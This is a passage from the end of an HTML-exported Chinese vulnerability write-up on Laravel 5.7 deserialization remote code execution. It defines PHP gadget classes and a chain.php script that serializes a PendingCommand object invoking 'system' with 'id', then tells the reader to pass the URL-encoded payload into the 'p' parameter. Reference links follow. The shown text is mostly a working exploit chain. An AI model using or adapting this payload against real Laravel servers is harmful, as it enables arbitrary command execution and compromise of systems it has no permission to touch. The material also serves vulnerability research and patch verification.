class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public function __construct($command, $parameters,$class,$app)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;command = $command;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;parameters = $parameters;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;test=$class;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;app=$app;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">namespace Illuminate\Auth{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;class GenericUser{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $attributes;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public function __construct(array $attributes){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;attributes = $attributes;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">namespace Illuminate\Foundation{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;class Application{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $hasBeenBootstrapped = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected $bindings;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public function __construct($bind){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;bindings=$bind;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//chain.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include(&quot;gadgets.php&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand(&quot;system&quot;,array(&#39;id&#39;),new Illuminate\Auth\GenericUser(array(&quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;),&quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;))),new Illuminate\Foundation\Application(array(&quot;Illuminate\Contracts\Console\Kernel&quot;=&gt;array(&quot;concrete&quot;=&gt;&quot;Illuminate\Foundation\Application&quot;))))));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行</span><span class="cs8926E06">chain.php</span><span class="cs9C1B1871">文件即可得到</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，将</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">传入</span><span class="cs8926E06">p</span><span class="cs9C1B1871">参数即可。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/5510#toc-1</span></p></body>
</html>
